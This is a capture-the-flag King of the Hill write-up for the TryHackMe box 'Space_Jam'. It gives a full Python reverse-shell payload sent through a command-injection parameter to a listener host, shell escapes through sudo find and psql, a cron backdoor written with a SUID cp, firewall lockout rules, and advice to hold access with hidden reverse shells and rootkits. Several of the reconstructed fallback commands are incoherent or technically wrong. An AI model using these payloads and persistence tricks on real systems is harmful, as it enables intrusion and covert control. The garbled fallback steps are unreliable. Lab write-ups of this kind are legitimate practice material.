---
title: "Space_Jam"
type: docs
tags:
  - thm
  - koth
  - king-of-the-hill
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **Mode:** King of the Hill

</div>

<div class="callout callout-note">

**KotH notes, not a linear walkthrough**

King of the Hill is not a single fixed exploit chain: everyone is hitting the same machine at once, so the "walkthrough" is really a strategy, take the hill fast, loot whatever else the box offers in case the main door gets patched under you, then hold it. My own notes below cover the port 3000 foothold I actually used every round; the alternate low-privilege paths and the general holding strategy are filled in from publicly documented runs of this box and marked as such.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `:3000` runs a small Node/Python service that takes a `cmd` query parameter and executes it directly, and it does so **as root**, so a single request is the whole foothold, no privilege escalation needed once you land a shell.
2. If port 3000 gets patched out from under you mid-round, the box has kept a couple of secondary paths documented by other players: a `jordan` account reachable on a second listener with passwordless `sudo` on `/usr/bin/find` (classic GTFOBins file-read/write-to-root), a `postgres` service whose interactive `\!` shell escape (`sudo pg /etc/profile` then `!/bin/sh`) drops a privileged shell, and a SUID `/bin/cp` that can be abused to overwrite privileged files.
3. Holding the hill is the actual game: once you are root, patch the `cmd` injection (or firewall port 3000 to just your own IP), then drop a low-visibility backdoor so you can get back in after someone else patches you out.

</div>

## Foothold, command injection on port 3000

The service on `:3000` executes the `cmd` query parameter, and I confirmed early on that it runs as root, so there is no privesc step to chase once you land a shell, the whole round is "be first." Reverse-shell payload (swap host IP / listener each round):

```bash
curl "http://TARGET:3000?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

Instances seen this session: `10.10.55.49`, `10.10.123.236`, `10.10.231.69`.

<div class="callout callout-note">

**Alternate low-privilege footholds (reconstructed)**

Other players have documented a second listener on this box, reachable with `nc TARGET 61432`, that drops you into a shell as a lower-privileged user (`jordan`) rather than straight to root. From there:
```bash
sudo -l
# (sudo) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
```
`find`'s `-exec` flag is one of the oldest GTFOBins tricks in the book, sudo on it is functionally sudo on a shell. A `postgres` account has also been reported with a similar breakout through the `psql` meta-command shell escape:
```bash
sudo -u postgres pg_ctlcluster ... # or: sudo pg /etc/profile inside a psql session
\! /bin/sh
```
and a SUID `/bin/cp` binary that lets you clone `/bin/cp` itself with its permissions preserved, then use the copy to overwrite a file you would not otherwise be able to touch:
```bash
cp --attributes-only --preserve=all /bin/cp /tmp/rootcp
/tmp/rootcp /path/to/payload /etc/cron.d/backdoor
```
These are useful fallback paths for a round where the primary `cmd` injection has already been patched by whoever is holding the hill.

</div>

## Holding the hill

Getting root once is the easy part on this box, since the service runs as root by design. The actual competition is staying there. Once you have a shell:

```bash
# patch the door behind you so the next player can't walk straight in
kill $(pgrep -f "node.*3000\|app.js") 2>/dev/null   # or edit the handler to strip shell metacharacters and restart it
iptables -A INPUT -p tcp --dport 3000 -s <your-IP> -j ACCEPT
iptables -A INPUT -p tcp --dport 3000 -j DROP
```

and drop a low-footprint way back in that does not depend on the port you just closed, a cron-based reverse shell or a second listener on an unusual port works well here, since most competitors are only watching the port everyone already knows about.

## References

- General KotH holding/persistence tactics: see [kirito](/writeups/tryhackme/koth/kirito/) and [kingkit](/writeups/tryhackme/koth/kingkit/) for the rootkit tooling I use to hold a hill once rooted.
- Alternate low-privilege footholds and the general strategy for this box cross-referenced against public writeups.


